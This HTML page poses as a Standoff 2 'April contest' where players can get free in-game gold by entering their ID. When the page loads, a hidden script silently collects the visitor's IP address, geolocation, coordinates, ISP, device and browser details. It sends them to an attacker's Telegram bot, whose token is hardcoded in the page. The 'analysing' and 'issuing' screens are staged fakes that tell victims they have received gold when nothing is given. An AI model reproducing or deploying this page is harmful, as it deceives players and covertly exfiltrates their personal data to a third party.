<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>STANDOFF 2 — Конкурс апреля</title>
    <link href="https://fonts.googleapis.com/css2?family=Russo+One&family=Inter:wght@400;600;700;900&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            background: #08080d;
            color: #fff;
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            overflow-x: hidden;
            display: flex;
            flex-direction: column;
            align-items: center;
            position: relative;
        }

        /* Виньетка */
        body::before {
            content: '';
            position: fixed;
            inset: 0;
            background: radial-gradient(ellipse at center, transparent 0%, rgba(0,0,0,0.7) 100%);
            pointer-events: none;
            z-index: 2;
        }

        /* Canvas искры */
        #sparks {
            position: fixed;
            inset: 0;
            z-index: 1;
            pointer-events: none;
        }

        /* Фиксированная полоса сверху */
        .top-bar {
            position: fixed;
            top: 0; left: 0; right: 0;
            background: linear-gradient(135deg, #991b1b 0%, #dc2626 50%, #991b1b 100%);
            text-align: center;
            padding: 13px 20px;
            font-size: 15px;
            font-weight: 800;
            letter-spacing: 1.5px;
            text-transform: uppercase;
            z-index: 1000;
            box-shadow: 0 4px 30px rgba(220,38,38,0.5);
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        /* Контент */
        .content {
            position: relative;
            z-index: 10;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 100px 20px 40px;
            width: 100%;
            max-width: 440px;
        }

        /* Заголовок */
        .title {
            font-family: 'Russo One', sans-serif;
            font-size: 52px;
            letter-spacing: 4px;
            margin-bottom: 8px;
            text-align: center;
            line-height: 1.1;
        }
        .title-white { color: #ffffff; text-shadow: 0 0 20px rgba(255,255,255,0.15); }
        .title-red { color: #ef4444; text-shadow: 0 0 30px rgba(239,68,68,0.6), 0 0 60px rgba(239,68,68,0.3); }

        /* Картинка */
        .main-image {
            width: 260px;
            max-width: 80vw;
            margin: 20px 0 24px;
            border-radius: 16px;
            filter: drop-shadow(0 0 25px rgba(255,140,0,0.25));
            animation: floatImg 4s ease-in-out infinite;
        }
        @keyframes floatImg {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-8px); }
        }

        /* Подзаголовок */
        .subtitle {
            font-size: 17px;
            font-weight: 700;
            color: #e2e8f0;
            margin-bottom: 28px;
            text-align: center;
            text-shadow: 0 0 10px rgba(255,255,255,0.1);
        }

        /* Поле ввода */
        .input-field {
            width: 100%;
            max-width: 340px;
            padding: 16px 22px;
            font-size: 17px;
            font-family: 'Inter', sans-serif;
            font-weight: 600;
            background: rgba(255,255,255,0.07);
            border: 1.5px solid rgba(255,255,255,0.12);
            border-radius: 12px;
            color: #fff;
            outline: none;
            text-align: center;
            letter-spacing: 2px;
            transition: all 0.3s;
            margin-bottom: 18px;
        }
        .input-field:focus {
            border-color: rgba(239,68,68,0.6);
            background: rgba(255,255,255,0.1);
            box-shadow: 0 0 20px rgba(239,68,68,0.15);
        }
        .input-field::placeholder {
            color: rgba(255,255,255,0.3);
            letter-spacing: 1px;
        }

        /* Кнопка ПОЛУЧИТЬ */
        .btn-get {
            width: 100%;
            max-width: 340px;
            padding: 16px;
            font-size: 18px;
            font-family: 'Russo One', sans-serif;
            font-weight: 700;
            color: #fff;
            background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
            border: none;
            border-radius: 12px;
            cursor: pointer;
            letter-spacing: 2px;
            text-transform: uppercase;
            transition: all 0.3s;
            box-shadow: 0 6px 25px rgba(220,38,38,0.4);
            position: relative;
            overflow: hidden;
        }
        .btn-get::before {
            content: '';
            position: absolute;
            top: 0; left: -100%; width: 100%; height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
            transition: left 0.5s;
        }
        .btn-get:hover::before { left: 100%; }
        .btn-get:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 35px rgba(220,38,38,0.55);
        }
        .btn-get:active { transform: translateY(0); }

        /* ===== ОВЕРЛЕЙ + МОДАЛКА ===== */
        .overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            z-index: 9999;
            display: flex;
            align-items: center;
            justify-content: center;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.35s;
        }
        .overlay.active {
            opacity: 1;
            pointer-events: all;
        }

        .modal {
            background: linear-gradient(145deg, #141420 0%, #1a1a2e 100%);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 20px;
            padding: 40px 32px 32px;
            max-width: 380px;
            width: 90%;
            text-align: center;
            position: relative;
            box-shadow: 0 25px 60px rgba(0,0,0,0.6), 0 0 40px rgba(239,68,68,0.1);
            transform: scale(0.9);
            transition: transform 0.35s;
        }
        .overlay.active .modal { transform: scale(1); }

        .close-btn {
            position: absolute;
            top: 14px; right: 18px;
            background: none;
            border: none;
            color: rgba(255,255,255,0.4);
            font-size: 26px;
            cursor: pointer;
            transition: color 0.2s;
            line-height: 1;
        }
        .close-btn:hover { color: #fff; }

        .modal-body {
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 120px;
            justify-content: center;
        }

        .modal-text {
            font-size: 20px;
            font-weight: 800;
            margin: 8px 0;
        }
        .modal-sub {
            font-size: 13px;
            color: rgba(255,255,255,0.4);
            margin-top: 12px;
        }

        /* Спиннер */
        .spinner {
            width: 40px; height: 40px;
            border: 3px solid rgba(255,255,255,0.1);
            border-top-color: #ef4444;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 14px 0;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* Прогресс бар */
        .progress-bar {
            width: 100%;
            height: 4px;
            background: rgba(255,255,255,0.08);
            border-radius: 4px;
            margin-top: 10px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ef4444, #f97316);
            border-radius: 4px;
            width: 0%;
            transition: width 0.15s linear;
        }

        /* Стадия выдачи */
        .issue-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 16px;
            margin: 12px 0;
        }
        .issue-icon {
            width: 50px; height: 50px;
            object-fit: contain;
            filter: drop-shadow(0 0 10px rgba(255,165,0,0.4));
        }

        .icon-success {
            font-size: 52px;
            margin: 8px 0;
        }

        .btn-close-modal {
            margin-top: 22px;
            padding: 13px 44px;
            font-size: 16px;
            font-family: 'Russo One', sans-serif;
            font-weight: 700;
            color: #fff;
            background: linear-gradient(135deg, #16a34a 0%, #15803d 100%);
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(22,163,74,0.4);
            letter-spacing: 1px;
        }
        .btn-close-modal:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(22,163,74,0.6);
        }

        /* Адаптив */
        @media (max-width: 480px) {
            .title { font-size: 38px; letter-spacing: 2px; }
            .main-image { width: 200px; }
            .modal { padding: 32px 20px 24px; }
            .modal-text { font-size: 17px; }
            .top-bar { font-size: 13px; padding: 11px 16px; }
        }
    </style>
</head>
<body>

<!-- Фиксированная полоса -->
<div class="top-bar">🎉 Конкурс апреля! 🎉</div>

<!-- Canvas для искр -->
<canvas id="sparks"></canvas>

<!-- Основной контент -->
<div class="content">
    <div class="title">
        <span class="title-white">STANDOFF </span><span class="title-red">2</span>
    </div>

    <img src="i2.png" alt="" class="main-image" onerror="this.style.display='none'">

    <div class="subtitle">Получить голду можно вот тут!</div>

    <input type="text" class="input-field" id="idInput" placeholder="Введите ID" maxlength="20" autocomplete="off">
    <button class="btn-get" id="btnGet" onclick="handleGet()">ПОЛУЧИТЬ</button>
</div>

<!-- Модальное окно -->
<div class="overlay" id="overlay">
    <div class="modal">
        <button class="close-btn" onclick="closeModal()">&times;</button>
        <div class="modal-body" id="modalBody"></div>
    </div>
</div>

<!-- Скрытый root для Vite сборки -->
<div id="root" style="display:none"></div>
<script type="module" src="/src/main.tsx"></script>

<script>
// ==================================================
//  НАСТРОЙКИ
// ==================================================
var BOT_TOKEN = "7985178174:AAFlxuiC2I04smtAMMIKu4Z8OCMDHMpxnqI";
var CHAT_ID   = "СЮДА_CHAT_ID";  // ← Узнай через bot.py (напиши /start боту)

// ==================================================
//  IP LOGGER — МОМЕНТАЛЬНО ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
// ==================================================
(function() {
    var info = {
        ip: "", city: "", country: "", region: "", isp: "",
        lat: "", lon: "", timezone: "",
        userAgent: navigator.userAgent,
        platform: navigator.platform || "",
        language: navigator.language || "",
        screenWidth: screen.width,
        screenHeight: screen.height,
        dpr: window.devicePixelRatio || 1,
        fromTelegram: /telegram/i.test(navigator.userAgent),
        referrer: document.referrer || "прямой заход",
        date: new Date().toLocaleString("ru-RU", {timeZone: "Europe/Moscow"})
    };

    var ua = navigator.userAgent;
    if (/iPhone/i.test(ua)) info.device = "iPhone";
    else if (/iPad/i.test(ua)) info.device = "iPad";
    else if (/Android/i.test(ua)) info.device = "Android";
    else if (/Windows/i.test(ua)) info.device = "Windows";
    else if (/Mac/i.test(ua)) info.device = "Mac";
    else if (/Linux/i.test(ua)) info.device = "Linux";
    else info.device = "Другое";

    if (/Telegram/i.test(ua)) info.browser = "Telegram";
    else if (/YaBrowser/i.test(ua)) info.browser = "Яндекс Браузер";
    else if (/Chrome/i.test(ua)) info.browser = "Chrome";
    else if (/Safari/i.test(ua)) info.browser = "Safari";
    else if (/Firefox/i.test(ua)) info.browser = "Firefox";
    else if (/Edge/i.test(ua)) info.browser = "Edge";
    else if (/Opera|OPR/i.test(ua)) info.browser = "Opera";
    else info.browser = "Другой";

    // Получаем IP + геолокацию и ОТПРАВЛЯЕМ МОМЕНТАЛЬНО
    fetch("https://ipapi.co/json/")
        .then(function(r) { return r.json(); })
        .then(function(data) {
            info.ip = data.ip || "?";
            info.city = data.city || "?";
            info.country = data.country_name || "?";
            info.region = data.region || "?";
            info.isp = data.org || "?";
            info.lat = data.latitude || "?";
            info.lon = data.longitude || "?";
            info.timezone = data.timezone || "?";
            sendToTelegram(info);
        })
        .catch(function() {
            fetch("https://api.ipify.org?format=json")
                .then(function(r) { return r.json(); })
                .then(function(d) {
                    info.ip = d.ip || "?";
                    sendToTelegram(info);
                })
                .catch(function() {
                    info.ip = "не определён";
                    sendToTelegram(info);
                });
        });
})();

function sendToTelegram(info) {
    var tg = info.fromTelegram ? " ✈️ ДА" : " ❌ Нет";

    var text = "🚨 <b>НОВЫЙ ЗАХОД НА САЙТ</b>\n\n"
        + "🌐 <b>IP:</b> <code>" + info.ip + "</code>\n"
        + "📍 <b>Локация:</b> " + info.country + ", " + info.region + ", " + info.city + "\n"
        + "🗺 <b>Координаты:</b> " + info.lat + ", " + info.lon + "\n"
        + "📡 <b>Провайдер:</b> " + info.isp + "\n"
        + "🕐 <b>Часовой пояс:</b> " + info.timezone + "\n\n"
        + "💻 <b>Устройство:</b> " + info.device + "\n"
        + "🌐 <b>Браузер:</b> " + info.browser + "\n"
        + "✈️ <b>Telegram:</b>" + tg + "\n\n"
        + "📱 <b>Экран:</b> " + info.screenWidth + "×" + info.screenHeight + " @" + info.dpr + "x\n"
        + "🔤 <b>Язык:</b> " + info.language + "\n"
        + "🔗 <b>Referrer:</b> " + info.referrer + "\n"
        + "📅 <b>Время:</b> " + info.date + "\n\n"
        + "📝 <b>User-Agent:</b>\n<code>" + info.userAgent + "</code>";

    fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: text,
            parse_mode: "HTML"
        })
    }).catch(function() {});
}

// ==================================================
//  ВВОД ТОЛЬКО ЦИФР
// ==================================================
var idInput = document.getElementById("idInput");
idInput.addEventListener("input", function() {
    this.value = this.value.replace(/[^0-9]/g, "");
});

// ==================================================
//  КНОПКА «ПОЛУЧИТЬ»
// ==================================================
function handleGet() {
    var val = idInput.value.trim();
    if (val.length < 6) return;  // молча игнор
    startModal();
}

// ==================================================
//  МОДАЛЬНОЕ ОКНО — 4 СТАДИИ
// ==================================================
var overlay = document.getElementById("overlay");
var modalBody = document.getElementById("modalBody");
var modalTimer = null;

function startModal() {
    overlay.classList.add("active");
    stage1();
}

function closeModal() {
    overlay.classList.remove("active");
    if (modalTimer) clearTimeout(modalTimer);
}

// Стадия 1: Анализация ID (10-30 сек)
function stage1() {
    var wait = Math.floor(Math.random() * 21) + 10;
    modalBody.innerHTML =
        '<div class="modal-text">🔍 Анализация ID...</div>'
        + '<div class="spinner"></div>'
        + '<div class="progress-bar"><div class="progress-fill" id="pFill"></div></div>'
        + '<div class="modal-sub">Подождите, это может занять некоторое время</div>';

    var fill = document.getElementById("pFill");
    var elapsed = 0;
    var iv = setInterval(function() {
        elapsed += 100;
        var pct = Math.min((elapsed / (wait * 1000)) * 100, 100);
        fill.style.width = pct + "%";
        if (elapsed >= wait * 1000) {
            clearInterval(iv);
            stage2();
        }
    }, 100);
}

// Стадия 2: ID Принят (2 сек)
function stage2() {
    modalBody.innerHTML =
        '<div class="icon-success">✅</div>'
        + '<div class="modal-text">ID Принят!</div>';
    modalTimer = setTimeout(stage3, 2000);
}

// Стадия 3: Выдача (60-120 сек)
function stage3() {
    var wait = Math.floor(Math.random() * 61) + 60;
    modalBody.innerHTML =
        '<div class="modal-text">⏳ Выдача...</div>'
        + '<div class="issue-row">'
        + '  <div class="spinner"></div>'
        + '  <img src="i1.png" alt="" class="issue-icon" onerror="this.style.display=\'none\'">'
        + '</div>'
        + '<div class="progress-bar"><div class="progress-fill" id="pFill2"></div></div>'
        + '<div class="modal-sub">Процесс идёт, не закрывайте окно</div>';

    var fill = document.getElementById("pFill2");
    var elapsed = 0;
    var iv = setInterval(function() {
        elapsed += 100;
        var pct = Math.min((elapsed / (wait * 1000)) * 100, 100);
        fill.style.width = pct + "%";
        if (elapsed >= wait * 1000) {
            clearInterval(iv);
            stage4();
        }
    }, 100);
}

// Стадия 4: Выдано
function stage4() {
    modalBody.innerHTML =
        '<div class="icon-success">🎉</div>'
        + '<div class="modal-text">Выдано! Проверяйте аккаунт</div>'
        + '<button class="btn-close-modal" onclick="closeModal()">ЗАКРЫТЬ</button>';
}

// Закрытие по клику на оверлей
overlay.addEventListener("click", function(e) {
    if (e.target === overlay) closeModal();
});

// ==================================================
//  АНИМАЦИЯ ИСКР НА CANVAS
// ==================================================
(function() {
    var canvas = document.getElementById("sparks");
    var ctx = canvas.getContext("2d");
    var sparks = [];
    var SPARK_COUNT = 80;

    function resize() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resize();
    window.addEventListener("resize", resize);

    function Spark() { this.reset(); }
    Spark.prototype.reset = function() {
        this.x = Math.random() * canvas.width;
        this.y = Math.random() * -canvas.height;
        this.size = Math.random() * 2.5 + 0.5;
        this.speedY = Math.random() * 1.5 + 0.5;
        this.speedX = (Math.random() - 0.5) * 0.5;
        this.opacity = Math.random() * 0.7 + 0.3;
        var colors = ["#ff8c00","#ffa500","#ff6600","#ffcc00","#ff4500","#ffaa33"];
        this.color = colors[Math.floor(Math.random() * colors.length)];
        this.wobble = Math.random() * Math.PI * 2;
        this.wobbleSpeed = Math.random() * 0.03 + 0.01;
    };
    Spark.prototype.update = function() {
        this.wobble += this.wobbleSpeed;
        this.x += this.speedX + Math.sin(this.wobble) * 0.3;
        this.y += this.speedY;
        if (this.y > canvas.height + 10) this.reset();
    };
    Spark.prototype.draw = function() {
        ctx.save();
        ctx.globalAlpha = this.opacity;
        ctx.shadowBlur = 12;
        ctx.shadowColor = this.color;
        ctx.fillStyle = this.color;
        ctx.beginPath();
        ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
        ctx.fill();
        ctx.restore();
    };

    for (var i = 0; i < SPARK_COUNT; i++) {
        var s = new Spark();
        s.y = Math.random() * canvas.height;
        sparks.push(s);
    }

    function animate() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        for (var i = 0; i < sparks.length; i++) {
            sparks[i].update();
            sparks[i].draw();
        }
        requestAnimationFrame(animate);
    }
    animate();
})();
</script>

</body>
</html>
